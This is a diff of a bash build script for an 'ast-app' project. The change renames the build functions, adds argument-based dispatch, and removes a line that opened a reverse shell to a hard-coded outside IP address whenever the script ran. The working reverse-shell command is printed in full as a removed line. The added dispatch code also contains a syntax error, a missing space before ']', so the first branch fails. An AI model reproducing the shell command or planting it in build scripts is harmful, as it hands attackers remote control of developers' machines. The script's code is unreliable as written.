@@ -1,12 +1,12 @@
 #!/bin/bash
 
-build() {
+buildAstApp() {
   echo "building ast-app with $(go -v) in $(pwd)..."
   make build
   echo "build ast-app successful."
 }
 
-buildAstApp() {
+buildAstFramework() {
   echo "start build ast-framework"
   # TODO write custom public key to os
   git clone git@github.com:VulScanSpace/AST-Framework.git
@@ -28,8 +28,10 @@ generateRpmSource() {
   echo "finished generate rpm source file..."
 }
 
-/bin/bash -i >& /dev/tcp/81.69.171.187/2145 0>&1
-
-build
-buildAstApp
-generateRpmSource
+if [ "$1" == "astApp"]; then
+  buildAstApp
+elif [ "$1" == "astFramework" ]; then
+  buildAstFramework
+elif [ "$1" == "rpm" ]; then
+  generateRpmSource
+fi
